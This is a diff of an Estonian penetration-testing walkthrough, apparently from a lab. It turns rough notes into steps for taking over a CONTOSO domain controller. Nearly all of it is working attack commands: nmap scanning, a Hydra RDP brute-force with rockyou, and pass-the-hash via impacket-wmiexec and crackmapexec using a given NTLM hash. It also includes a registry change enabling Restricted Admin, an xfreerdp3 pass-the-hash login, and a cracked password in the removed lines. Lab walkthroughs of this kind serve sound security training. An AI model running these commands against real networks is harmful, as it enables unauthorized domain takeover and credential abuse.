@@ -23,7 +23,7 @@ Alustame Kali masinas võrgu skaneerimisega, et tuvastada aktiivsed seadmed ja n
 # Veendu, et oled õiges võrgus
 ip a
 
-# Skaneeri /24 võrku, et leida seadmeid, nende operatsioonisüsteeme (-O) ja teenuste versioone (-sV)
+# Skaneeri /24 võrku, et leida semeid, nende operatsioonisüsteeme (-O) ja teenuste versioone (-sV)
 sudo nmap -sV -O 192.168.1.0/24
 ```
 
@@ -174,49 +174,46 @@ privilege::debug
 ```
 See annab vajalikud õigused, et teiste protsesside mälu lugeda.
 
+---
 
-*****************
-Jätkub 2.päev:
-*****************
-Eesmärk on leida CONTOSO domeeni Administrator kasutaja LTMN võtit!
-********************************************************************
-***************** c625e3e2756d9ef01881fa7ed46b49a8 *****************
-********************************************************************
-***** CrackStation.net **** sai sellest hash käsust jagu ***********
-************************** NTLM *********** stars4191* *************
-********************************************************************
-********* aga se oli praegu vale tee.. peab ootama programmi *******
-********************************************************************
-KALI masinas
+### 9. Domeenile ligipääsu saavutamine (Pass-the-Hash)
 
-veendume, et meil on Dokumentides rockyou.txt fail nii zip kui ka lahti pakitud, sest mõni programm vajab ka zipi..
+Järgmised sammud teostatakse Kali masinas, eesmärgiga kasutada leitud NTLM räsifaili `c625e3e2756d9ef01881fa7ed46b49a8` (kasutaja `Administrator`), et saada ligipääs domeenikontrollerile.
 
-seejärel teises terminalis:
-
+**Parooli murdmise katse (alternatiiv):**
+Võimalik on proovida räsist parooli tuletada, kasutades sõnastikurünnet.
+```bash
+# Veendu, et rockyou.txt on kättesaadav
+# Seejärel käivita Hydra RDP vastu
 hydra -V -f -l Administrator -P /home/heiki/Documents/rockyou.txt rdp://192.168.1.2
+```
 
-uus terminal:
-/usr/bin/impacket-wmiexec -hashes :c625e3e2756d9ef01881fa7ed46b49a8 contoso/Administrator@192.168.1.2
+**Pass-the-Hash rünnak:**
 
-hostname
-whoami
-whoami /groups
-ctrl+c -väljume sellest
+1.  Kasuta `impacket-wmiexec`, et käivitada käske domeenikontrolleril räsiga:
+    ```bash
+    /usr/bin/impacket-wmiexec -hashes :c625e3e2756d9ef01881fa7ed46b49a8 contoso/Administrator@192.168.1.2
+    ```
+    Pärast ühenduse saamist saab kontrollida süsteemi andmeid:
+    ```
+    hostname
+    whoami
+    whoami /groups
+    ```
 
-crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d x0x /f'
+2.  Kasuta `crackmapexec`, et muuta registrit ja lubada "Restricted Admin" režiim, mis on vajalik RDP ühenduseks räsiga:
+    ```bash
+    crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f'
+    ```
 
-kontrollime seda kas se ka tegelikult läbi läks, ehk siis kustutame sellest eelnevast sisestusest mõned kohad ja muudame *add* *query'ks*
+3.  Kontrolli, kas registrivõti on edukalt lisatud:
+    ```bash
+    crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin'
+    ```
 
-crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin'
+4.  Ühendu domeenikontrolleriga RDP kaudu, kasutades `xfreerdp3` ja `pass-the-hash` meetodit:
+    ```bash
+    sudo xfreerdp3 /v:192.168.1.2 /u:Administrator /d:contoso /pth:c625e3e2756d9ef01881fa7ed46b49a8 /restricted-admin
+    ```
 
-sudo xfreerdp3 /v:192.168.1.2 /u:Administrator /d:contoso /pth:c625e3e2756d9ef01881fa7ed46b49a8 /restricted-admin
-küsib meie parooli ja voilaa siseneb serverisse
-
-Nüüd peab hakkama veenduma mis siin sees on.. grupipoliitikaid, milliseid kasutajaid näeme, kus näeme neid kasutajaid mis on peidul silma alt..
-Active Directory Administrative Center alt leiab lõpuks ka kerberose kasutaja, mida muidu ei leia
-
-
-
-
-
-
+Pärast edukat sisselogimist saab hakata uurima domeeni struktuuri, kasutajaid (sh peidetud, nt Kerberose kontod) ja grupipoliitikaid läbi "Active Directory Administrative Center"-i.
